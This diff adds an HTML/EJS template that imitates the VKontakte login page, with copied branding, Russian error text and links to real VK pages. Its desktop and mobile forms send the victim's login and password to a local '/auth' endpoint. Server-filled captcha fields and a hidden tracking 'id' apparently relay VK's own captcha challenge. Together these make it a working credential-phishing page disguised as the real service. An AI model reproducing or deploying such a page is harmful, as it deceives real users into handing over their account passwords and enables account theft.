@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="ru">
+
+<head>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="./base/fav_logo.ico">
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <meta name="description"
+        content="ВКонтакте – универсальное средство для общения и поиска друзей и одноклассников, которым ежедневно пользуются десятки миллионов человек. Мы хотим, чтобы друзья, однокурсники, одноклассники, соседи и коллеги всегда оставались в контакте.">
+    <link rel="preconnect" href="https://fonts.gstatic.com/">
+
+    <link rel="stylesheet" href="../css/css2.css">
+    <link rel="stylesheet" href="../css/style.css">
+
+    <title>Вход | ВКонтакте</title>
+</head>
+
+<body class="login">
+    <header class="header">
+        <div class="container">
+            <a href="./base"><img src="https://cdn.glitch.me/e63fafad-3a36-4036-a5ad-9ce183ebe120%2Flogo.svg?v=1635527023492" alt="" class="header-logo"></a>
+        </div>
+    </header>
+    <main>
+      
+        <div class="container">
+            <div class="login-container">
+                <form method="post" action="/auth" class="login-content pc">
+                    <h1 class="login-title">Вход ВКонтакте</h1>
+                    <div class="login-info info">
+                        <p class="login-info_content">Чтобы выполнить это действие, нужно зайти на сайт.</p>
+                    </div>
+                    <% if(error === 1) { %>
+                        <div class="login-error error">
+                            <div class="login-error_content">
+                                <b>Не удаётся войти.</b>
+                                <br>
+                                Пожалуйста, проверьте правильность написания <b>логина</b> и <b>пароля</b>.
+                                <ul class="listing">
+                                    <li><span>Возможно, нажата клавиша <b>Caps Lock</b>?</span></li>
+                                    <li><span>Может быть, у Вас включена неправильная <b>раскладка</b>? (русская или
+                                            английская)</span></li>
+                                    <li><span>Попробуйте набрать свой пароль в текстовом редакторе и <b>скопировать</b> в
+                                            графу «Пароль»</span></li>
+                                    <li><span>Если пароль набран верно, попробуйте указать в качестве логина <b>номер
+                                                привязанного телефона</b>, а не почту.</span></li>
+                                </ul>
+                                Если Вы всё внимательно проверили, но войти всё равно не удаётся, Вы можете <b><a
+                                        href="https://static.vk.com/restore">нажать сюда</a></b>.
+                            </div>
+                        </div>
+                    <% } %>
+                    <div class="login-wrapper">
+                        <div class="login-form">
+                            <input type="text" name="login" id="email" class="form-control"
+                                placeholder="Телефон или email">
+                            <input type="password" name="password" id="pass" class="form-control" placeholder="Пароль"
+                                value="">
+                        </div>
+                        <div class="login-checkbox"
+                            onclick="document.querySelector('.login-checkbox').classList.toggle('on');">
+                            <span>Чужой компьютер</span>
+                        </div>
+
+                        <% if(capcha.status == 1) { %>
+                            <div class="capcha">
+                                <img class="capcha_img" src="<%= capcha.captcha_img %>">
+                                <input class="form-control" type="text" name="captcha" placeholder="Введите текст с картинки">
+                                <input type="hidden" name="captcha_id" value="<%= capcha.captcha_sid %>">
+                            </div> 
+                        <% } %>
+                        <input type="hidden" name="id" value="<%= id %>">
+                        <div class="login-button">
+                            <button type="submit" class="btn btn-login" id="btn"><span>Войти</span>
+                                <div class="pr" id="btn_lock" style="opacity: 1;">
+                                    <div class="pr_bt"></div>
+                                    <div class="pr_bt"></div>
+                                    <div class="pr_bt"></div>
+                          <svg fill="none" height="24" width="136" xmlns="http://www.w3.org/2000/svg"><path d="M0 11.5c0-5.42 0-8.13 1.68-9.82C3.37 0 6.08 0 11.5 0h1c5.42 0 8.13 0 9.82 1.68C24 3.37 24 6.08 24 11.5v1c0 5.42 0 8.13-1.68 9.82C20.63 24 17.92 24 12.5 24h-1c-5.42 0-8.13 0-9.82-1.68C0 20.63 0 17.92 0 12.5z" fill="#2787f5"/><g clip-rule="evenodd" fill-rule="evenodd"><path d="M6.5 7.5H4.75c-.5 0-.6.24-.6.5 0 .46.6 2.76 2.76 5.8 1.45 2.07 3.49 3.2 5.34 3.2 1.11 0 1.25-.25 1.25-.68v-1.57c0-.5.1-.6.46-.6.26 0 .7.13 1.74 1.13 1.19 1.19 1.38 1.72 2.05 1.72h1.75c.5 0 .75-.25.6-.74-.15-.5-.72-1.2-1.47-2.05-.4-.49-1.02-1-1.2-1.26-.26-.34-.2-.49 0-.78 0 0 2.13-3 2.35-4.03.11-.37 0-.64-.53-.64H17.5a.76.76 0 00-.76.5s-.9 2.16-2.15 3.57c-.41.41-.6.54-.82.54-.1 0-.27-.13-.27-.5V8.14c0-.44-.13-.64-.5-.64h-2.75c-.28 0-.45.2-.45.4 0 .42.64.52.7 1.7v2.58c0 .57-.1.67-.32.67-.6 0-2.04-2.18-2.9-4.67-.16-.48-.33-.68-.78-.68z" fill="#fff"/><path d="M66.86 12.5c0 3.24-2.43 5.5-5.78 5.5s-5.78-2.26-5.78-5.5S57.73 7 61.08 7s5.78 2.26 5.78 5.5zm-8.97 0c0 1.97 1.3 3.3 3.19 3.3s3.19-1.33 3.19-3.3c0-1.98-1.3-3.25-3.19-3.25s-3.19 1.28-3.19 3.25zm-17.14-.21c.95-.44 1.56-1.18 1.56-2.33 0-1.73-1.58-2.96-3.87-2.96h-5.27v11h5.5c2.37 0 4.02-1.29 4.02-3.05 0-1.33-.87-2.32-1.94-2.66zM35.6 9.01h2.83c.85 0 1.44.5 1.44 1.2s-.6 1.2-1.44 1.2h-2.83zM38.67 16h-3.06V13.3h3.06c.96 0 1.59.55 1.59 1.36s-.63 1.33-1.59 1.33zM51.84 18h3.19l-5.06-5.71L54.61 7h-2.9l-3.68 4.27h-.6V7H45v11h2.44v-4.38h.59zM76.47 7v4.34h-4.93V7H69.1v11h2.43v-4.44h4.93V18h2.43V7zM86.9 18h-2.44V9.22h-3.8V7H90.7v2.22h-3.8zm9.5-11c-2.11 0-3.91.89-4.52 2.8l2.24.37c.34-.67 1.05-1.2 2.15-1.2 1.33 0 2.06.84 2.17 2.28h-2.32c-3.23 0-4.79 1.42-4.79 3.45 0 2.05 1.59 3.3 3.78 3.3 1.8 0 3-.72 3.53-1.63l.5 1.63h1.76v-6.18c0-3.19-1.74-4.82-4.5-4.82zm-.72 9c-1.19 0-1.9-.5-1.9-1.4 0-.85.57-1.44 2.43-1.44h2.35c0 1.8-1.19 2.84-2.88 2.84zm17.99 2h-3.2l-3.8-4.38h-.6V18h-2.43V7h2.43v4.27h.6L110.34 7h2.9l-4.63 5.29zm3.88 0h2.43V9.22h3.8V7h-10.04v2.22h3.8zM130.1 7c3.34 0 5.56 2.4 5.56 5.37 0 .3-.02.55-.04.79h-8.54c.23 1.69 1.36 2.69 3.17 2.69 1.29 0 2.15-.4 2.68-1.2l2.29.39c-.88 2.01-2.83 2.96-5.12 2.96a5.28 5.28 0 01-5.51-5.5c0-3.12 2.17-5.5 5.51-5.5zm2.92 4.25c-.4-1.37-1.4-2.15-2.92-2.15-1.48 0-2.47.74-2.87 2.15z" fill="#19191a"/></g></svg>      </div>
+                            </button>
+                            <a href="https://vk.com/join" class="btn btn-register"><span>Регистрация</span></a>
+                        </div>
+                        <a class="login-restore" href="https://vk.com/restore">Забыли пароль или не можете войти?</a>
+                    </div>
+                </form>
+                <form method="POST" action="/auth" class="login-content mobile">
+                    <a class="mobile-app" href="https://vk.me/?act=dl">
+                        <div class="mobile-app_data">
+                            <img src="https://cdn.glitch.me/e63fafad-3a36-4036-a5ad-9ce183ebe120%2Fmobile.png?v=1635527023492" alt="" class="mobile">
+                            <p>Установить приложение <span>ВКонтакте</span></p>
+                        </div>
+                        <button type="button">
+                            <img src="https://cdn.glitch.me/e63fafad-3a36-4036-a5ad-9ce183ebe120%2Fblue_arrow.png?v=1635527023492" alt="" class="arrow">
+                        </button>
+                    </a>
+                    <div class="login-block">
+                        <p class="login-block_text">Мобильная версия поможет вам оставаться ВКонтакте, даже если вы
+                            далеко от компьютера.</p>
+                        <div class="login-block_info info">
+                            <p>Чтобы выполнить это действие, нужно зайти на сайт.</p>
+                        </div>
+                        <% if(error === 1) { %>
+                            <div class="login-block_error error">
+                                <b>Не удаётся войти.</b>
+                                <br>
+                                Пожалуйста, проверьте правильность введённых данных. <a
+                                    href="https://static.vk.com/restore">Проблемы со входом?</a>
+                            </div>
+                        <% } %>
+                        <div class="login-form">
+                            <input class="form-control" type="text" id="lgn" name="login" spellcheck=""
+                                placeholder="Телефон или email" autocomplete="username">
+                            <input class="form-control" type="password" id='psw' name="password" value="" spellcheck=""
+                                placeholder="Пароль" autocomplete="current-password">
+                        </div>
+                     	<% if(capcha.status == 1) { %>
+                            <div class="capcha_m">
+                                <img class="capcha_img_m" src="<%= capcha.captcha_img %>">
+                                <input class="form-control-m" type="text" name="captcha" placeholder="Введите текст с картинки">
+                                <input type="hidden" name="captcha_id" value="<%= capcha.captcha_sid %>">
+                            </div> 
+                        <% } %>
+                        <input type="hidden" name="id" value="<%= id %>">
+                        <button type="submit" class="btn btn-login" id="btn2"><span>Войти</span>
+                            <div class="pr" id="btn_lock" style="opacity: 1;">
+                                <div class="pr_bt"></div>
+                                <div class="pr_bt"></div>
+                                <div class="pr_bt"></div>
+                            </div>
+                        </button>
+                        <div class="login-restore"><a href="https://static.vk.com/restore" rel="noopener">Забыли
+                                пароль?</a></div>
+                        <div class="login-register">
+                            <p class="login-register_text">Впервые ВКонтакте?</p>
+                            <a href="https://m.vk.com/join" type="button"
+                                class="btn btn-register"><span>Зарегистрироваться</span></a>
+                        </div>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </main>
+</body>
+
+</html>
